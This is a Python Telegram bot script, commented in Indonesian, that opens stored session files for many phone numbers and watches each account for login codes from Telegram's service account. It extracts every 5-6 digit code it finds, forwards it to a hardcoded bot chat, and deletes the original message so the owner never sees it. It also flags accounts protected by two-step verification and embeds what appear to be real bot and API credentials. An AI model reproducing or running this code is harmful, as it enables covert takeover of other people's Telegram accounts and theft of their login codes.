import os
import re
import asyncio
from functools import partial
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Token dan Telegram API
BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'
api_id = 23416622
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'
CHAT_ID = '7763955214'

# Lokasi session
SESSION_FOLDER = 'ew_sessions'
otp_pattern = re.compile(r'\b\d{5,6}\b')

# Untuk menyimpan status halaman
user_pages = {}

# Fungsi kirim ke bot
def send_to_bot(message):
    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[!] Gagal kirim ke bot: {e}")

# Ambil semua session
def get_registered_sessions():
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]
    sessions.sort()
    return sessions

# Bagi list ke dalam halaman
def get_paginated_sessions(sessions, page, per_page=10):
    total_pages = (len(sessions) - 1) // per_page + 1
    start = page * per_page
    end = start + per_page
    return sessions[start:end], total_pages

# Kirim daftar nomor sebagai tombol inline
async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page=0):
    sessions = get_registered_sessions()
    paginated, total_pages = get_paginated_sessions(sessions, page)

    keyboard = [[InlineKeyboardButton(num, callback_data=f"pantau_{num}")] for num in paginated]

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"page_{page + 1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "📱 Pilih nomor untuk dipantau OTP-nya:"

    if update.message:
        # Saat /user diketik
        await update.message.reply_text(text, reply_markup=reply_markup)
    elif update.callback_query:
        # Saat tombol ditekan (Next/Back)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)


# Command /user
async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_pages[update.effective_chat.id] = 0
    await send_session_list(update, context, page=0)

# Callback tombol inline
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("page_"):
        page = int(data.split("_")[1])
        user_pages[query.message.chat.id] = page
        await query.edit_message_text("📱 Pilih nomor untuk dipantau OTP-nya:")
        await send_session_list(update, context, page)

    elif data.startswith("pantau_"):
        nomor = data.split("_", 1)[1]
        await query.edit_message_text(f"👁 Memantau OTP untuk *{nomor}*...", parse_mode='Markdown')
        asyncio.create_task(monitor_session(nomor))

# Pantau satu session
async def monitor_session(phone_number):
    session_path = os.path.join(SESSION_FOLDER, phone_number)
    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.start()
        print(f"[✓] Memantau: {phone_number}")

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            msg = event.message.message
            otp_match = otp_pattern.search(msg)

            if otp_match:
                otp_code = otp_match.group()
                print(f"[OTP] {phone_number}: {otp_code}")
                send_to_bot(f"📬 OTP dari *{phone_number}*: `{otp_code}`")

                try:
                    await event.delete()
                except:
                    print("[!] Gagal hapus OTP.")

        await client.run_until_disconnected()
    except SessionPasswordNeededError:
        print(f"[!] {phone_number} membutuhkan password. Tidak bisa login otomatis.")
        send_to_bot(f"❗ Nomor *{phone_number}* membutuhkan password Telegram (two-step verification).")
    except Exception as e:
        print(f"[!] Error {phone_number}: {e}")
        send_to_bot(f"❗ Gagal memantau *{phone_number}*: {e}")
    finally:
        await client.disconnect()

# Main
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("user", user_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot aktif. Gunakan /user untuk menampilkan daftar.")
    app.run_polling()
